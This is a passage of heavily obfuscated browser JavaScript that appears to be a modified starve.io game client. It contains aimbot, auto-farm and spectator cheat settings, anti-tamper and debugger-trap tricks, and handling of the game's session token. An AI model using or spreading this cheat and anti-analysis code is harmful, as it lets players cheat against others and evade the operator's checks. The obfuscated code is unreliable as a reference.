			var ⵠᐃⲆⲆ = Math.random();
			return "t"
		}

		function ᐃΔⵠᐃΔᐃⲆⲆᐃ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "b"
		}

		function ⵠⲆⲆᐃᐃⵠΔⵠⵠ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "2"
		}

		function ⲆᐃΔⵠⲆⵠⵠ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "o"
		}

		function ⲆᐃΔⲆⵠΔᐃ() {
			var ⵠΔⲆΔᐃᐃⵠ = ⵠⲆᐃⲆⵠⲆⲆ() + ⵠⵠⲆΔΔᐃⵠ() + ᐃᐃᐃᐃⲆⲆΔ() + ᐃⲆⲆⵠⵠᐃⲆ();
			var ⲆⲆᐃⲆ = ᐃΔⲆᐃⵠΔΔⵠⵠ() + ⲆⵠⵠΔΔᐃⵠ() + ᐃΔⵠᐃΔᐃⲆⲆᐃ() + ΔΔⵠΔⲆᐃⵠᐃᐃ() + ⲆᐃΔⵠⲆⵠⵠ() + ᐃᐃᐃⵠⵠⲆⵠⲆⵠ() + ᐃᐃⵠⲆΔΔⲆⵠⵠ() + ⲆⵠⵠΔΔᐃⵠ() + ᐃᐃᐃᐃⲆⲆΔ();
			if (-1 === ᐃⲆᐃΔᐃⵠᐃ[ⲆⲆᐃⲆ][ΔᐃⲆⵠⲆⵠΔ[31]]().indexOf(ⵠΔⲆΔᐃᐃⵠ)) Math.floor = function() {
				return Math.round() + ΔΔᐃⵠ
			};
			var ⲆᐃΔⲆ = ⲆᐃⵠⵠΔΔᐃ() + ⲆⵠⵠΔΔᐃⵠ() + ⵠⲆᐃⲆⵠⲆⲆ() + ΔⲆΔⲆⲆⲆΔ();
			var ⲆΔᐃⲆ = ΔᐃᐃⵠⲆⲆΔ() + ΔⲆⲆⲆᐃⵠᐃ() + ⲆᐃΔⵠⲆⵠⵠ() + ᐃᐃᐃᐃⲆⲆΔ() + ⲆᐃΔⵠⲆⵠⵠ() + ᐃᐃᐃᐃⲆⲆΔ() + ⵠᐃⲆᐃΔⲆΔⵠⵠ() + ΔᐃᐃⵠⲆⲆΔ() + ⲆⵠⵠΔΔᐃⵠ(); - Ⲇᐃⵠ === ᐃⲆᐃΔᐃⵠᐃ[ⲆⲆᐃⲆ][ⲆΔᐃⲆ][ⲆᐃΔⲆ][ΔᐃⲆⵠⲆⵠΔ[31]]().indexOf(ⵠΔⲆΔᐃᐃⵠ) && (Math.floor = function() {
				return Math.round() + ΔᐃⲆⵠ
			});
			var ⲆⲆᐃⲆ = ΔⲆΔⲆⲆⲆΔ() + ΔⲆⲆⲆᐃⵠᐃ() + ⵠⵠⲆΔΔᐃⵠ() + ⵠⲆΔᐃᐃΔⲆⲆᐃ() + ΔⵠⵠⲆΔⲆΔΔᐃ() + ΔⵠⵠΔⲆⲆΔⲆⵠ() + ⵠⵠⲆΔΔᐃⵠ() + ΔⵠΔⲆΔⲆᐃ() + ⲆⵠⵠΔΔᐃⵠ();
			var ⲆᐃΔⲆ = ΔΔᐃⲆᐃⲆⵠ() + ⵠⵠⲆΔΔᐃⵠ() + ⵠⲆᐃⲆⵠⲆⲆ() + ⵠⲆⲆΔᐃΔⵠΔⲆ() + ⵠⵠⲆΔΔᐃⵠ() + ⲆᐃⵠⵠΔΔᐃ() + ΔΔᐃᐃΔⵠΔⵠⵠ() + ⲆⵠⵠΔΔᐃⵠ() + ⵠⲆᐃⲆⵠⲆⲆ() + ΔⲆΔⲆⲆⲆΔ() + ⲆⵠⵠΔΔᐃⵠ() + ΔⲆⲆⲆᐃⵠᐃ() + ᐃⲆⲆⵠⵠᐃⲆ() + ⵠⲆᐃⲆⵠⲆⲆ() + ΔⵠΔⲆΔⲆᐃ() + ΔΔᐃⲆᐃⲆⵠ() + ⲆᐃΔⵠⲆⵠⵠ() + ⵠⲆᐃⲆⵠⲆⲆ() + ᐃᐃᐃᐃⲆⲆΔ() + ⲆⵠⵠΔΔᐃⵠ() + ⵠⲆᐃⲆᐃⵠⲆⲆᐃ() + ᐃᐃᐃᐃⲆⲆΔ() + ⵠⲆⲆᐃᐃⵠΔⵠⵠ() + ᐃⵠⵠᐃᐃⵠΔⲆᐃ();
			ᐃⲆᐃΔᐃⵠᐃ[ⲆᐃΔⲆ][ⲆΔᐃⲆ][ⲆⲆᐃⲆ][ΔᐃⲆⵠⲆⵠΔ[31]]().indexOf(ⵠΔⲆΔᐃᐃⵠ) === -ΔⵠⲆΔ && (Math.floor = function() {
				return Math.round() + 1
			});
			setTimeout(ⲆᐃΔⲆⵠΔᐃ, 1e5)
		}

		function ᐃⵠⵠᐃᐃⵠΔⲆᐃ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "D"
		}

		function ᐃΔⲆᐃⵠΔΔⵠⵠ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "W"
		}
		const ⵠΔⲆᐃⵠⵠᐃ = String.fromCharCode;
		const ᐃⵠⲆⵠⵠΔΔ = 101;
		const ⵠᐃᐃΔⲆᐃΔᐃᐃ = 118;
		const ᐃⵠⲆⵠⲆΔᐃⲆΔ = "ΔΔⵠᐃΔᐃᐃ";
		const ⲆⵠΔⵠᐃᐃᐃΔⵠ = 97;
		const ΔᐃᐃᐃᐃⲆⵠ = 108;
		const ⵠΔΔΔᐃᐃΔᐃᐃ = ⵠΔⲆᐃⵠⵠᐃ(ᐃⵠⲆⵠⵠΔΔ);
		const ⵠᐃᐃⲆΔⲆⲆⲆⵠ = ⵠΔⲆᐃⵠⵠᐃ(ⵠᐃᐃΔⲆᐃΔᐃᐃ);

		function ΔΔⵠᐃΔᐃᐃ() {
			ⵠⲆⲆᐃΔⵠᐃ = ΔΔⵠᐃΔᐃᐃ;
			return ΔΔⵠᐃΔᐃᐃ
		}
		const ⵠⵠⵠΔⲆᐃⵠ = ⵠΔⲆᐃⵠⵠᐃ(ⲆⵠΔⵠᐃᐃᐃΔⵠ);
		const ⲆΔⵠⲆᐃⵠⲆⲆⲆ = ⵠΔⲆᐃⵠⵠᐃ(ΔᐃᐃᐃᐃⲆⵠ);
		const ⲆⲆᐃΔⲆᐃΔ = ⵠΔΔΔᐃᐃΔᐃᐃ + ⵠᐃᐃⲆΔⲆⲆⲆⵠ + ⵠⵠⵠΔⲆᐃⵠ + ⲆΔⵠⲆᐃⵠⲆⲆⲆ;
		const ΔⲆΔΔⵠΔⵠ = ᐃⲆᐃΔᐃⵠᐃ[ⲆⲆᐃΔⲆᐃΔ];
		const ΔⲆⵠᐃⲆⲆΔᐃΔ = ΔⲆΔΔⵠΔⵠ(ΔΔⵠᐃΔᐃᐃ + "try{" + ᐃⵠⲆⵠⲆΔᐃⲆΔ + "();0;}catch(ⵠⵠⵠΔⲆᐃⵠ){1;}");
		if (ΔⲆⵠᐃⲆⲆΔᐃΔ) {
			const ⵠΔⲆᐃⵠⵠᐃ = function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]]("mousemove", (function() {
					ⵠΔⲆᐃⵠⵠᐃ()
				}))
			};
			ⵠΔⲆᐃⵠⵠᐃ()
		}

		function ⵠⵠⲆΔΔᐃⵠ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "a"
		}

		function ΔᐃᐃⵠⲆⲆΔ() {
			var ⵠᐃⲆⲆ = Math.random();
			return "p"
		}

		function ᐃⲆΔᐃⲆΔΔⵠᐃ() {
			this.ⲆⲆⲆΔⵠ = function() {};
			this.ⵠᐃΔΔⲆ = {
				"ⲆⲆΔᐃⵠ": ᐃΔᐃⲆ,
				open: ⲆⲆᐃⵠᐃ,
				"ⲆⵠⵠΔ": ⵠΔᐃ
			};
			this.Ⲇⵠⵠⵠⵠ = {
				open: ᐃⵠΔⵠⲆ,
				"ⲆⵠⵠΔ": ΔᐃⲆⵠ,
				"ⲆⲆΔᐃⵠ": -1
			};
			this.ΔΔΔⵠ = {
				"ΔΔΔⲆᐃ": Δᐃᐃᐃ,
				open: ⵠΔⲆⲆⲆ,
				"ⲆⲆΔᐃⵠ": -1,
				"ⲆⵠⵠΔ": ΔᐃᐃⲆ,
				"ᐃⵠⲆᐃⵠᐃΔ": ᐃⵠΔ
			};
			this.ⲆΔΔⲆ = {
				"ⲆᐃⲆⵠⲆⵠⲆ": Ⲇᐃᐃᐃ,
				"ⵠⵠᐃΔⵠⲆΔ": ΔⲆⵠⲆ,
				type: ⵠᐃⲆᐃ,
				"ⲆⵠᐃⵠΔⲆⵠ": 0,
				"ⲆⵠⵠΔ": ⵠΔᐃ,
				"ⲆⲆΔᐃⵠ": -ᐃᐃⵠ,
				open: false
			};
			this.ᐃΔᐃΔ = {
				"ⲆⲆΔᐃⵠ": -1,
				"ⲆᐃⲆⵠⲆⵠⲆ": 0,
				"ⲆⲆⲆⵠΔΔΔ": 0,
				open: ⲆⲆⲆᐃⵠ,
				"ⲆⵠⵠΔ": 1,
				"ΔΔΔⲆᐃ": ᐃⵠⲆⵠ
			};
			this.sign = {
				open: ⲆΔᐃⲆΔ,
				"ⲆⲆΔᐃⵠ": -1
			};
			this.ΔⲆᐃⲆⵠ = {
				"ⲆΔⲆⲆ": ΔΔⵠ,
				"ⲆⵠⵠΔ": 1,
				"ⲆⲆΔᐃⵠ": -ⵠᐃⵠΔ,
				open: false
			};
			this.Ⲇⵠⵠⵠᐃ = {
				enabled: false,
				"ΔⲆΔⲆΔ": -ⵠΔᐃ,
				label: ΔⵠΔⲆΔ,
				now: -ᐃᐃⲆΔ,
				"ΔᐃΔⵠ": ᐃΔⲆᐃⵠΔⲆⲆᐃ
			};
			this.ⲆᐃⲆΔ = {
				id: -ⵠᐃⵠΔ,
				"ⲆΔⲆⲆ": Ⲇᐃⵠⵠ,
				"ⲆⵠⵠΔ": 1,
				"ⲆⲆΔᐃⵠ": -ΔᐃⲆⵠ,
				open: false,
				lock: false,
				locked: ⲆⲆⲆᐃⵠ,
				"ΔᐃⲆⲆⵠⲆΔ": false,
				"ⵠᐃⵠᐃⵠᐃⵠ": false
			};
			this.ᐃⵠⵠΔΔ = ᐃⲆᐃᐃⲆ;
			this.reconnect = {
				rotate: 0,
				enabled: ⲆⲆᐃⵠᐃ
			};
			this.key = ΔΔⲆᐃ.ⵠᐃⵠⵠⲆⲆΔ("key", ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[71]][ΔᐃⲆⵠⲆⵠΔ[135]]);
			var ΔᐃᐃᐃᐃⲆⲆ = ΔΔⲆᐃ.ⵠᐃⵠⵠⲆⲆΔ("egg", ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[71]][ΔᐃⲆⵠⲆⵠΔ[135]]);
			ΔᐃᐃᐃᐃⲆⲆ && (ⵠⲆᐃΔ.ⲆⵠⲆᐃ = parseInt(ΔᐃᐃᐃᐃⲆⲆ));
			this.beta = ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[71]][ΔᐃⲆⵠⲆⵠΔ[135]].indexOf("http://starve.io/beta") === 0 ? 1 : 0;
			if (this.key && this.beta) {
				ΔΔᐃᐃ.set("starve_beta", this.key)
			} else this.beta && (this.key = ΔΔᐃᐃ.get("starve_beta"));
			this.ᐃΔΔⲆⲆ = ΔΔᐃᐃ.get("starve_token") ? ΔΔᐃᐃ.get("starve_token") : ΔΔⲆᐃ.ᐃⵠⲆᐃⲆⵠΔ(ᐃⲆⵠᐃᐃ.ᐃⵠᐃⲆᐃⵠᐃᐃⵠ);
			ᐃⲆᐃΔᐃⵠᐃ["baguette"]();
			var ᐃΔⲆᐃⲆᐃⲆΔⲆ = ᐃⲆᐃΔᐃⵠᐃ["kot2"];
			this.ᐃΔΔⲆⲆ = ᐃΔⲆᐃⲆᐃⲆΔⲆ.substring(ⲆⲆⲆᐃ, ΔⵠⵠⲆΔ) + this.ᐃΔΔⲆⲆ.substring(6);
			this.ᐃΔⵠⲆᐃⵠⲆ = ΔΔᐃᐃ.get("starve_token_id") ? ΔΔᐃᐃ.get("starve_token_id") : "";
			this.id = ⵠᐃⲆᐃ;
			this.ⲆᐃΔΔ = ⵠⲆᐃⵠ;
			this.ᐃΔⲆ = ⵠΔⲆⵠ;
			this.ΔᐃΔⲆⲆᐃᐃ = {
				"ᐃⵠᐃⵠⵠ": ᐃⵠⲆ,
				"ⲆᐃᐃⲆᐃ": 0,
				"ⲆᐃΔᐃⲆΔⵠ": "",
				"ΔΔΔᐃⲆⲆᐃ": 0
			};
			this.ⵠΔᐃΔΔⵠᐃⲆⵠ = {
				connected: ⵠᐃⲆᐃ,
				"ⵠΔⲆΔⵠ": (new Date).getTime()
			};
			this.ⲆᐃⵠⲆΔ = [];
			this.ⵠᐃⲆΔΔΔΔ = function(ᐃΔ) {
				for (var ⵠᐃ = ΔΔⵠⵠ; this.ⲆᐃⵠⲆΔ.length > ⵠᐃ; ⵠᐃ++) {
					if (this.ⲆᐃⵠⲆΔ[ⵠᐃ] == ᐃΔ) return ⲆΔΔⲆΔ
				}
				return false
			};
			this.ΔᐃᐃⲆΔ = {
				"ΔⲆΔⲆΔ": ΔⲆⵠⲆ,
				time: 0,
				value: 0,
				open: ᐃᐃΔᐃΔ,
				"ΔᐃΔⵠ": function() {
					if (this[ΔᐃⲆⵠⲆⵠΔ[72]]) {
						var ᐃᐃΔⲆⵠ = (new Date).getTime();
						this.time = Math.floor((ᐃᐃΔⲆⵠ - this.ΔⲆΔⲆΔ) / 1e3);
						if (this.time < 60) {
							ΔⵠⵠⲆ.ΔᐃᐃⲆΔ.button.ΔᐃΔⵠ(Δ)
						} else {
							document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[412]).style.display = ⵠ[465];
							this[ΔᐃⲆⵠⲆⵠΔ[72]] = ᐃⲆᐃⵠΔ
						}
					}
				}
			};
			this.ⵠΔΔᐃⵠ = {
				id: -ⵠΔⲆ,
				"ⲆⵠⵠΔ": -1,
				lock: ᐃⵠⲆ,
				timeout: new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 0, 1, 0, 1 / 30, 1),
				wait: false
			};
			this.ⲆⲆⵠⲆΔ = {
				timeout: new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 0, 1, Ⲇᐃᐃᐃ, 1 / 5, ΔⵠⲆΔ),
				wait: false
			};
			this.ᐃⲆⲆⵠᐃ = {
				timeout: new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 0, 1, 0, ⵠΔᐃ, ⵠΔⵠΔ),
				wait: ᐃⵠⵠⲆᐃ
			};
			this.ⲆᐃΔᐃΔ = {
				timeout: new ΔΔⲆᐃ.Δⵠᐃᐃ(ΔⵠΔⲆΔ, 0, ΔⵠΔⵠ, ΔΔⵠ, ⵠΔⲆ / ΔⲆⵠⲆⲆ, 1),
				wait: ⵠΔⲆⲆⲆ
			};
			this.ⲆΔΔ = new ΔΔⲆᐃ.ⵠΔᐃᐃⲆΔΔ(ΔΔⲆᐃ.ⵠΔⲆᐃᐃⵠⵠ, ΔᐃΔΔ, .4, ΔᐃΔΔ, ⵠⲆᐃⵠ, Δᐃⵠᐃ, ᐃΔⵠᐃ, Δᐃⵠᐃ, ᐃΔⵠᐃ);
			this.ⲆΔΔ.ΔⲆΔⲆΔ = 0;
			this.ⲆΔΔ.ᐃᐃⵠᐃΔⲆⲆ = Δⵠᐃ;
			this.ⲆΔΔ.ⵠⲆᐃ = function() {
				if (this.ᐃᐃⵠᐃΔⲆⲆ > 0) {
					this.ᐃᐃⵠᐃΔⲆⲆ -= ᐃⵠᐃᐃ;
					return
				}
				var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
				if (ᐃⲆⲆ && !Settings.Spectator.enabled) {
					this.ΔⲆΔⲆΔ = 0;
					var Δⵠ = Math.max(Math.min(Δᐃⵠᐃ - ᐃⲆⲆ.x, -2), -ⲆⲆⲆ.w + 2 + ΔΔΔᐃ);
					var ⲆⵠⲆ = Math.max(Math.min(ᐃΔⵠᐃ - ᐃⲆⲆ.y, -2), -ⲆⲆⲆ.ⵠⵠᐃ + ᐃⵠⲆⲆⲆ + ⵠⲆᐃⲆ);
					this.ⲆΔᐃⵠΔ({
						x: Δⵠ,
						y: ⲆⵠⲆ
					})
				} else {
					this.ΔⲆΔⲆΔ += ᐃⵠᐃᐃ;
					if (3 < this.ΔⲆΔⲆΔ) {
						this.ΔⲆΔⲆΔ = ⲆΔⵠ;
						!ᐃᐃΔ.reconnect.enabled && ΔⵠⲆᐃ.ΔⲆⲆΔⵠᐃΔΔᐃ()
					}
				}
			};
			this.ⲆΔΔ.w = 4000;
			this.ⲆΔΔ.ⵠⵠᐃ = 4000;
			this.ⲆΔΔ.ⲆᐃᐃᐃⲆⵠⲆ = this.ⲆΔΔ.w;
			this.ⲆΔΔ.ᐃΔⵠΔΔΔᐃ = this.ⲆΔΔ.ⵠⵠᐃ;
			this.ⲆΔΔ.rx = ᐃⵠⲆ;
			this.ⲆΔΔ.ry = ⵠᐃⲆᐃ;
			this.ⲆΔΔ.ΔᐃΔⵠᐃᐃΔᐃⵠ = ᐃΔΔ;
			this.ⲆΔΔ.ᐃᐃΔΔᐃᐃⵠⵠⵠ = 0;
			this.ⲆΔΔ.ⲆⲆᐃΔⲆ = function(Δⵠ, ⲆⵠⲆ) {
				this.x = -Math.min(Math.max(-ⲆⲆⲆ.ᐃⲆⵠⲆᐃΔᐃ * ΔⵠⵠΔ, Δⵠ - ⲆⲆⲆ.ᐃⲆⵠⲆᐃΔᐃ - this.ⲆᐃᐃᐃⲆⵠⲆ / ΔⵠⵠΔ), ⲆⲆⲆ.w - this.ⲆᐃᐃᐃⲆⵠⲆ);
				this.y = -Math.min(Math.max(-ⲆⲆⲆ.ⲆⲆⵠᐃⵠⵠⵠ * ᐃⲆⵠᐃ, ⲆⵠⲆ - (ⲆⲆⲆ.ⲆⲆⵠᐃⵠⵠⵠ + this.ᐃΔⵠΔΔΔᐃ) / 2), ⲆⲆⲆ.ⵠⵠᐃ - this.ᐃΔⵠΔΔΔᐃ + ⲆⲆⲆ.ⲆⲆⵠᐃⵠⵠⵠ);
				this.ΔᐃΔⲆΔ = this.x;
				this.ΔⵠⵠⵠᐃΔⵠ = this.y
			};
			this.control = {
				angle: Ⲇᐃⵠⵠ,
				timeout: 0,
				"ⵠⲆⵠⲆᐃᐃᐃ": ᐃΔΔ,
				"ⲆⲆⵠⵠ": 0,
				attack: Ⲇᐃⵠⵠ,
				"ⵠⲆᐃ": function() {
					var ᐃⲆⲆ = Settings.AimBot.enabled && Settings.AimBot.angle !== null ? Settings.AimBot.angle : Settings.AutoFarm.enabled && Settings.AutoFarm.angle !== null ? Settings.AutoFarm.angle : ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
					if (ᐃⲆⲆ) var ⵠΔΔᐃ = {
						x: ᐃᐃΔ.ⲆΔΔ.x + ᐃⲆⲆ.x,
						y: ᐃᐃΔ.ⲆΔΔ.y + ᐃⲆⲆ.y
					};
					else var ⵠΔΔᐃ = ᐃⲆᐃⵠⲆⲆΔ;
					var ⲆᐃΔ = ΔΔⲆᐃ.ΔᐃⵠᐃⵠᐃΔ(ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠΔΔᐃ);
					var ⲆᐃΔⲆⵠᐃΔ = false;
					this.ⲆⲆⵠⵠ += 5 * ᐃⵠᐃᐃ;
					if (!ⲆⲆⵠⵠ.state) {
						if (ᐃⲆⲆ && !(ᐃⲆⲆ.action & ⵠⵠⵠⲆ.ᐃⵠⵠᐃⵠⵠⵠ) && this.ⲆⲆⵠⵠ > ᐃⲆⵠᐃᐃ.ᐃⵠⵠᐃⵠⵠⵠ) {
							this.attack = ᐃᐃⲆΔ;
							ⲆᐃΔⲆⵠᐃΔ = true;
							this.ⲆⲆⵠⵠ = Δᐃᐃᐃ;
							ΔⵠⲆᐃ.ᐃⲆΔⵠⲆⵠⲆⵠⵠ(ⲆᐃΔ)
						}
					}
					if (ᐃⲆⲆ) {
						ᐃⲆⲆ.angle = ⲆᐃΔ;
						ᐃⲆⲆ.ⲆΔⲆⲆΔⲆΔ = ⲆᐃΔ
					}
					if (!ⲆᐃΔⲆⵠᐃΔ) {
						this.timeout += ᐃⵠᐃᐃ;
						if (this.timeout > ᐃⲆⵠᐃᐃ.ΔΔⲆⲆⲆΔΔ) {
							this.timeout = Δᐃᐃⵠ;
							if (Math.abs(this.angle - ⲆᐃΔ) > .005) {
								ΔⵠⲆᐃ.ⲆⵠⲆΔⲆΔⲆᐃᐃ(ⲆᐃΔ);
								this.angle = ⲆᐃΔ
							}
						}
					}
					if (ᐃᐃΔ.ⵠⵠⲆᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]) return;
					if (ᐃᐃΔ.ᐃᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]]) return;
					var ⵠⲆᐃ = ΔⵠΔⲆΔ;
					var ΔⲆⵠⲆΔ = Ⲇᐃᐃᐃ;
					var ⵠⲆⲆᐃⲆ = ΔⵠⵠΔΔ.ⵠⲆΔᐃⲆⲆΔ();
					if (ⵠⲆⲆᐃⲆ) ΔⲆⵠⲆΔ |= ᐃⲆᐃ;
					var ⵠΔᐃᐃ = ΔⵠⵠΔΔ.ᐃⲆⵠᐃⵠᐃⲆ();
					if (ⵠΔᐃᐃ) ΔⲆⵠⲆΔ |= ᐃⲆⵠᐃ;
					var ⵠΔΔΔⲆΔΔΔⵠ = ΔⵠⵠΔΔ.ⵠⲆⵠⲆΔᐃᐃ();
					if (ⵠΔΔΔⲆΔΔΔⵠ) ΔⲆⵠⲆΔ |= 4;
					var top = ΔⵠⵠΔΔ.ⲆΔⲆⵠᐃᐃⵠ();
					if (top) ΔⲆⵠⲆΔ |= ⵠⲆΔⵠᐃ;
					if (this.ⵠⲆⵠⲆᐃᐃᐃ != ΔⲆⵠⲆΔ) ΔⵠⲆᐃ.ᐃⲆΔᐃᐃᐃᐃᐃᐃ(ΔⲆⵠⲆΔ);
					this.ⵠⲆⵠⲆᐃᐃᐃ = ΔⲆⵠⲆΔ
				}
			};
			this.ⲆΔⲆⵠ = {
				c: 1,
				"ⲆⲆⵠΔ": 1,
				"ⵠⵠᐃ": 1,
				"ΔᐃⲆ": 1,
				"ᐃⲆΔ": 1,
				"ⲆⲆⵠΔΔⵠΔ": ΔᐃⲆⵠ,
				"ⲆⵠΔⲆⲆΔⲆ": new ΔΔⲆᐃ.Δⵠᐃᐃ(true, ⵠΔⲆⵠ, ΔᐃᐃⲆ, 0, 3, 3),
				"ΔⵠⲆⲆᐃᐃⵠ": new ΔΔⲆᐃ.Δⵠᐃᐃ(ΔᐃⲆⵠⵠ, ΔΔⵠⵠ, ΔⲆⵠ, ⵠⲆᐃⵠ, 2, 2),
				"ⵠᐃⵠΔᐃᐃⲆ": new ΔΔⲆᐃ.Δⵠᐃᐃ(true, 0, 1, ᐃⵠⲆⵠ, 3, 3),
				"ⲆⲆᐃⲆⲆⵠᐃ": new ΔΔⲆᐃ.Δⵠᐃᐃ(true, 0, 1, 0, 3, 3),
				"ΔΔⵠⵠΔᐃΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(true, 0, 1, 0, ᐃᐃⲆΔⵠ, ΔⲆᐃⲆ),
				"ᐃⵠᐃⲆΔΔᐃ": new ΔΔⲆᐃ.Δⵠᐃᐃ(true, 0, 1, ⵠΔⲆⵠ, ΔⲆΔᐃ, ᐃⲆᐃᐃ),
				"ΔΔⲆⲆᐃ": new ΔΔⲆᐃ.ⵠΔⵠⲆⲆ(ΔΔⲆᐃ.ⵠΔⲆᐃᐃⵠⵠ, 0, ΔⵠΔⵠ, 0, 0, ⵠᐃⵠΔ),
				"ᐃⵠΔᐃⵠ": new ΔΔⲆᐃ.ⵠΔⵠⲆⲆ(ΔΔⲆᐃ.ⵠΔⲆᐃᐃⵠⵠ, 0, 1, 0, ⵠᐃⲆᐃ, 1),
				"ᐃⵠⵠⵠΔⵠᐃ": new ΔΔⲆᐃ.ⵠΔⵠⲆⲆ(ΔΔⲆᐃ.ⵠΔⲆᐃᐃⵠⵠ, 0, Ⲇᐃⵠ, 0, 0, Ⲇᐃⵠ),
				"ᐃⵠⲆⲆΔⲆⵠ": new ΔΔⲆᐃ.ⵠΔⵠⲆⲆ(ΔΔⲆᐃ.ⵠΔⲆᐃᐃⵠⵠ, 0, 1, ᐃⵠⲆⵠ, 0, 1),
				"ⲆⵠΔⵠᐃⲆᐃ": new ΔΔⲆᐃ.ⵠΔⵠⲆⲆ(ΔΔⲆᐃ.ⵠΔⲆᐃᐃⵠⵠ, 0, 1, Δᐃᐃᐃ, ΔᐃΔΔ, ΔⵠⲆΔ),
				"ΔⵠⵠⲆⲆ": new ΔΔⲆᐃ.ⵠΔⵠⲆⲆ(ΔΔⲆᐃ.ⵠΔⲆᐃᐃⵠⵠ, 0, ᐃᐃⲆΔ, 0, ᐃΔΔ, 1),
				"ⵠⲆᐃ": function() {
					this.ⲆⵠΔⲆⲆΔⲆ.ⵠⲆᐃ();
					this.ΔⵠⲆⲆᐃᐃⵠ.ⵠⲆᐃ();
					this.ⵠᐃⵠΔᐃᐃⲆ.ⵠⲆᐃ();
					this.ⲆⲆᐃⲆⲆⵠᐃ.ⵠⲆᐃ();
					this.ΔΔⵠⵠΔᐃΔ.ⵠⲆᐃ();
					this.ᐃⵠᐃⲆΔΔᐃ.ⵠⲆᐃ();
					this.ΔΔⲆⲆᐃ.ⲆΔᐃⵠΔ(this.c);
					this.ᐃⵠΔᐃⵠ.ⲆΔᐃⵠΔ(this.ⲆⲆⵠΔ);
					this.ᐃⵠⵠⵠΔⵠᐃ.ⲆΔᐃⵠΔ(this.ⵠⵠᐃ);
					this.ᐃⵠⲆⲆΔⲆⵠ.ⲆΔᐃⵠΔ(this.ΔᐃⲆ);
					this.ⲆⵠΔⵠᐃⲆᐃ.ⲆΔᐃⵠΔ(this.ᐃⲆΔ);
					this.ΔⵠⵠⲆⲆ.ⲆΔᐃⵠΔ(this.ⲆⲆⵠΔΔⵠΔ)
				}
			};
			this.ⲆⵠᐃⲆⵠᐃⲆ = false;
			this.ⲆΔⵠΔⲆⵠⲆ = false;
			this.ⵠⵠⲆⵠⵠ = ⲆΔᐃⲆΔ;
			this.ΔⲆⵠΔⵠΔⲆ = false;
			this.ⲆⵠⲆⵠ = {
				max: ΔᐃᐃΔ.ΔᐃⲆΔⲆΔⲆ,
				"ᐃⵠΔΔⵠⲆⵠ": ⵠⲆᐃⵠ,
				"ΔⵠΔᐃⲆ": 0,
				"ᐃⵠⵠⵠ": [],
				"ⵠΔᐃⲆⵠ": [],
				"ⵠⵠⵠⵠⵠΔⲆ": function(ⵠⵠⲆΔⲆΔᐃΔⵠ, ⵠΔΔⲆⲆᐃᐃᐃⵠ) {
					if (ⵠⵠⲆΔⲆΔᐃΔⵠ === 1) this.ΔⵠΔᐃⲆ = ΔᐃᐃΔ.ΔⲆⵠΔⵠΔⵠⵠⵠ;
					this.ᐃⵠΔΔⵠⲆⵠ += ⵠΔΔⲆⲆᐃᐃᐃⵠ;
					this.max = ΔᐃᐃΔ.ΔᐃⲆΔⲆΔⲆ + this.ᐃⵠΔΔⵠⲆⵠ + this.ΔⵠΔᐃⲆ
				},
				"ᐃΔⵠΔᐃᐃΔ": {
					item: -ⵠΔΔ,
					"ᐃⵠ": null,
					"ΔⵠΔΔΔⲆᐃ": 0,
					"ΔⲆⲆᐃΔⵠΔ": 0,
					"ᐃΔⵠᐃᐃ": -ᐃᐃⵠ,
					"ᐃᐃΔⵠⵠ": -1,
					"ΔⲆⵠⲆΔ": function(ⲆⲆⵠⵠ) {
						if (this.ΔⵠΔΔΔⲆᐃ && (ⲆⲆⵠⵠ.x !== this.ᐃΔⵠᐃᐃ || ⲆⲆⵠⵠ.y !== this.ᐃᐃΔⵠⵠ)) this.ΔⲆⲆᐃΔⵠΔ = 1
					},
					start: function(ΔΔΔⵠⵠ, ⲆⲆⵠⵠ) {
						this.ᐃΔⵠᐃᐃ = ⲆⲆⵠⵠ.x;
						this.ᐃᐃΔⵠⵠ = ⲆⲆⵠⵠ.y;
						this.item = ΔΔΔⵠⵠ;
						this.ᐃⵠ = ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ[ΔΔΔⵠⵠ].info.ᐃⵠ[2];
						this.ΔⵠΔΔΔⲆᐃ = 1
					},
					stop: function() {
						this.ΔⵠΔΔΔⲆᐃ = 0;
						this.ΔⲆⲆᐃΔⵠΔ = 0;
						this.ᐃΔⵠᐃᐃ = -ΔᐃⲆⵠ;
						this.ᐃᐃΔⵠⵠ = -ⵠᐃⵠΔ
					},
					release: function() {
						var ΔΔΔⵠⵠ = -1;
						var Ⲇⵠⵠ = ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ;
						var ΔΔᐃΔⵠ = ΔⲆⵠⲆ;
						if (this.ΔⵠΔΔΔⲆᐃ && this.ΔⲆⲆᐃΔⵠΔ) {
							for (var ⵠᐃ = ΔΔⵠ; ⵠᐃ < Ⲇⵠⵠ.length; ⵠᐃ++) {
								if (Ⲇⵠⵠ[ⵠᐃ].info.state === ΔᐃⵠⵠᐃⲆⲆ) {
									ΔΔΔⵠⵠ = ⵠᐃ;
									break
								}
							}
							if (ΔΔΔⵠⵠ !== -1 && ΔΔΔⵠⵠ !== this.item && Ⲇⵠⵠ[this.item]) {
								ΔΔᐃΔⵠ = ΔⲆᐃᐃ;
								var ⲆᐃᐃᐃⵠΔᐃᐃΔ = Ⲇⵠⵠ[ΔΔΔⵠⵠ];
